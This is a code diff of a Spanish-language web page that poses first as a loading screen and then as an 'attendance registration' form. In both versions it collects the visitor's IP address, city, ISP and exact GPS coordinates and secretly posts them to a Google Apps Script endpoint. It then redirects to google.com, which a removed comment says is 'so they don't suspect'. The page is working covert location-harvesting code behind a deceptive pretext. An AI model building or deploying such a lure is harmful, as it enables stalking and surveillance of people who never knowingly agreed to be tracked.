@@ -3,40 +3,76 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cargando...</title>
+    <title>Registro de Asistencia</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f4f7f9; color: #333; }
-        .container { text-align: center; padding: 20px; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #007bff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        * { box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background-color: #f0f2f5; 
+            display: flex; justify-content: center; align-items: center; 
+            height: 100vh; margin: 0; 
+        }
+        .card { 
+            background: white; padding: 30px; border-radius: 15px; 
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1); 
+            text-align: center; max-width: 350px; width: 90%;
+        }
+        .icon { font-size: 50px; margin-bottom: 20px; }
+        h1 { font-size: 22px; color: #1c1e21; margin-bottom: 10px; }
+        p { color: #606770; font-size: 15px; line-height: 1.4; margin-bottom: 25px; }
+        .btn { 
+            background-color: #007bff; color: white; border: none; 
+            padding: 15px 25px; border-radius: 8px; font-size: 16px; 
+            font-weight: bold; cursor: pointer; width: 100%;
+            transition: background 0.3s;
+        }
+        .btn:hover { background-color: #0056b3; }
+        .footer { font-size: 11px; color: #bcc0c4; margin-top: 20px; }
+        
+        /* Estado de carga */
+        .hidden { display: none; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #007bff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="container">
+
+    <div class="card" id="main-card">
+        <div class="icon">📍</div>
+        <h1>Registro de Ubicación</h1>
+        <p>Para completar tu registro en este lugar, por favor confirma tu ubicación actual.</p>
+        <button class="btn" onclick="procesarRegistro()">Aceptar y Registrarme</button>
+        <div class="footer">Sistema de verificación segura</div>
+    </div>
+
+    <div class="card hidden" id="loading-card">
         <div class="loader"></div>
-        <p>Procesando solicitud de acceso...</p>
-        <p style="font-size: 12px; color: #888;">Por favor, espera un momento.</p>
+        <p>Verificando datos...</p>
     </div>
 
     <script>
-        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxBoNhdXNPe8qdEXCwFM6bCnkVkz-BMcrexWfClQzazELI60XWTs6KQlJ4-qNlZYXpknQ/exec'; // <--- CAMBIA ESTO
+        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxBoNhdXNPe8qdEXCwFM6bCnkVkz-BMcrexWfClQzazELI60XWTs6KQlJ4-qNlZYXpknQ/exec'; // <--- TU URL
 
-        async function enviarAExcel(datos) {
+        async function enviarDatos(datos) {
             try {
                 await fetch(SCRIPT_URL, {
                     method: 'POST',
                     mode: 'no-cors',
                     body: JSON.stringify(datos)
                 });
-            } catch (e) { console.error("Error al guardar:", e); }
-            
-            // Redirección final para que no sospechen
-            setTimeout(() => {
-                window.location.href = "https://www.google.com";
-            }, 1500);
+            } finally {
+                // Redirigir a una página de éxito o agradecimiento
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com"; 
+                }, 2000);
+            }
         }
 
-        async function iniciarProyecto() {
+        async function procesarRegistro() {
+            // Cambiar vista a cargando
+            document.getElementById('main-card').classList.add('hidden');
+            document.getElementById('loading-card').classList.remove('hidden');
+
             let datos = {
                 ip: "Desconocida",
                 location: "No disponible",
@@ -45,35 +81,31 @@
                 time: new Date().toLocaleString('es-CL')
             };
 
-            // 1. Obtener ubicación por IP (Ciudad, Región, ISP)
+            // 1. Obtener ubicación base por IP
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const ipData = await res.json();
                 datos.ip = ipData.ip;
-                datos.location = `IP: ${ipData.city}, ${ipData.region}, ${ipData.country_name} (${ipData.org})`;
-            } catch (e) { console.log("Error en IP API"); }
+                datos.location = `Ciudad: ${ipData.city} (Red)`;
+            } catch (e) { console.log("Error IP"); }
 
-            // 2. Intentar obtener GPS Exacto
+            // 2. Pedir GPS (ahora que el usuario hizo clic)
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
-                        // Si acepta, concatenamos Ciudad + Coordenadas exactas
-                        datos.location += ` | GPS: ${pos.coords.latitude}, ${pos.coords.longitude}`;
-                        enviarAExcel(datos);
+                        datos.location = `Exacta: ${pos.coords.latitude}, ${pos.coords.longitude}`;
+                        enviarDatos(datos);
                     },
                     (err) => {
-                        // Si rechaza, enviamos lo que ya tenemos (la ciudad por IP)
-                        console.log("GPS rechazado, usando ubicación por IP");
-                        enviarAExcel(datos);
+                        datos.location += " | GPS Denegado";
+                        enviarDatos(datos);
                     },
-                    { timeout: 6000 }
+                    { timeout: 8000 }
                 );
             } else {
-                enviarAExcel(datos);
+                enviarDatos(datos);
             }
         }
-
-        iniciarProyecto();
     </script>
 </body>
 </html>
